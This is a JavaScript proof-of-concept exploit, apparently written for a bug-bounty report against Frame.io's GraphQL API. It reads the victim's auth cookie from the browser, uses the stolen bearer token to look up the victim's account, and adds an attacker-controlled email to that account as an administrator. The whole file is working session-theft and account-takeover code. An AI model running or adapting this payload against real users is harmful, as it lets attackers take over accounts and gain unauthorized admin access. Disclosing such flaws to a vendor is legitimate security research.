// PoC script to extract session cookie and email, send requests, and process responses

// Extract the session cookie
const cookies = document.cookie.split('; ');
let authCookie = '';
for (const cookie of cookies) {
    if (cookie.startsWith('auth=')) {
        authCookie = cookie.split('=')[1];
        break;
    }
}

// Remove "Bearer%20" from the cookie
const authToken = decodeURIComponent(authCookie.replace('Bearer%20', ''));

// Generate static email
const generateNumber = Math.floor(Math.random() * 1000000); // Generate a random number
const email = `mrhavit+${generateNumber}@wearehackerone.com`;

if (!authToken || !email) {
    console.error('Required data (auth token or email) is missing.');
    throw new Error('PoC cannot proceed without auth token and email.');
}

// First fetch request
fetch('https://api.frame.io/graphql', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${authToken}`,
        'Apollographql-Client-Name': 'web-app',
    },
    body: JSON.stringify({
        operationName: "GetAccountsForRouting",
        variables: { first: 100 },
        query: `query GetAccountsForRouting($first: NonNegativeInt = 100) {
          me {
            id
            ... on AuthenticatedUser {
              accounts(page: {first: $first}, order: {direction: ASC, field: DISPLAY_NAME}) {
                nodes {
                  account {
                    id
                    version
                    __typename
                  }
                  __typename
                }
                __typename
              }
              __typename
            }
            __typename
          }
        }`
    })
}).then(response => response.json())
  .then(data => {
      // Extract id2 from the response
      const id2 = data?.data?.me?.accounts?.nodes[0]?.account?.id;

      if (!id2) {
          console.error('Failed to extract id2 from the response.');
          return;
      }

      console.log('Extracted id2:', id2);

      // Second fetch request
      fetch('https://api.frame.io/graphql', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${authToken}`,
              'Apollographql-Client-Name': 'web-app',
          },
          body: JSON.stringify({
              operationName: "UpsertAccountUsers",
              variables: {
                  input: {
                      accountId: id2,
                      members: [{ email }],
                      message: "",
                      roleId: "account/admin",
                      notify: true,
                      dryRun: false
                  }
              },
              query: `mutation UpsertAccountUsers($input: UpsertAccountUsersInput!) {
                  upsertAccountUsers(input: $input) {
                    accountUsers {
                      ...CompleteAccountUser
                      __typename
                    }
                    metadata {
                      changes {
                        __typename
                        ... on AccountUserAdded {
                          attributes {
                            licenseType
                            __typename
                          }
                          __typename
                        }
                        ... on AccountUserModified {
                          accountUser {
                            id
                            __typename
                          }
                          previousAttributes {
                            licenseType
                            role {
                              id
                              __typename
                            }
                            __typename
                          }
                          newAttributes {
                            licenseType
                            role {
                              id
                              __typename
                            }
                            __typename
                          }
                          __typename
                        }
                        ... on AccountUserNoop {
                          accountUser {
                            id
                            role {
                              id
                              __typename
                            }
                            __typename
                          }
                          __typename
                        }
                      }
                      predictedUsageByLicenseType {
                        member {
                          overSeatLimit
                          __typename
                        }
                        __typename
                      }
                      __typename
                    }
                    __typename
                  }
                }

                fragment CompleteAccountUser on AccountUser {
                  id
                  avatarColor
                  accountUserType
                  deactivatedAt
                  email
                  accountJoinedVia
                  deletedAt
                  insertedAt: accountJoinedAt
                  inviteEmailAddress
                  isDeactivated
                  isPending
                  licenseType
                  userLastActiveAt
                  name
                  profile {
                    jobTitle
                    organizationName
                    __typename
                  }
                  profileImageUrl
                  timezone
                  userId
                  __typename
                }`
          })
      }).then(response => response.json())
        .then(data => {
            console.log('Response from second request:', data);
        }).catch(err => console.error('Error in second request:', err));
  }).catch(err => console.error('Error in first request:', err));
